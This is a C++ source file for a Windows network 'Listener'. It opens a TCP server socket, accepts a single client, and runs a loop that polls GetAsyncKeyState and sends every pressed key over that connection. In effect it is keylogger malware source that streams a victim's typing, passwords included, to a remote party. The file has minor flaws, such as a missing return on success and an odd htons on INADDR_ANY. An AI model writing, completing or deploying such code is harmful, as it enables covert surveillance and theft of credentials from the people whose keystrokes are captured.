#include "Listener.h"

int Listener::recordAndSendKeys() {
	while (true) {
		for (char c = 2; c <= '~'; c++) {
			if (GetAsyncKeyState(c) == ACTIVE_PROMISE_CODE) {
				send(this->_client_socket, &c, sizeof(c), NULL);
			}
		}
	}
}

int Listener::init() {
	if (WSAStartup(MAKEWORD(2, 2), &this->_wsa_data) != 0) {
		std::cerr << "could not initialize winsock" << std::endl;
		return -1;
	}

	this->_listen_socket_info.sin_family = AF_INET;
	this->_listen_socket_info.sin_port = htons(this->_port);
	this->_listen_socket_info.sin_addr.s_addr = htons(INADDR_ANY);

	this->_listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (this->_listen_socket == INVALID_SOCKET) {
		std::cerr << "Socket creation failed." << std::endl;
		WSACleanup();
		return -1;
	}

	std::cout << "Binding..." << std::endl;
	if (bind(this->_listen_socket, (SOCKADDR*)&this->_listen_socket_info, sizeof(this->_listen_socket_info)) == -1) {
		std::cerr << "Error while binding." << std::endl;
		closesocket(this->_listen_socket);
		WSACleanup();
		return -1;
	}
	std::cout << "Binded." << std::endl;

	return 0;
}

int Listener::listenAndAccept() {
	int client_sock_addr_len = 0;

	std::cout << "Attempting to listen..." << std::endl;
	if (listen(this->_listen_socket, 1) != 0) {
		std::cerr << "Error while Attempting to listen." << std::endl;
		closesocket(this->_listen_socket);
		WSACleanup();
		return -1;
	}
	std::cout << "Listening of port " << this->_port << std::endl;

	client_sock_addr_len = sizeof(this->_client_sock_info);
	this->_client_socket = accept(this->_listen_socket, (SOCKADDR*)&this->_client_sock_info, &client_sock_addr_len);
	if (this->_client_socket == -1) {
		std::cerr << "Could not accept socket connection." << std::endl;
		closesocket(this->_listen_socket);
		WSACleanup();
		return -1;
	}
}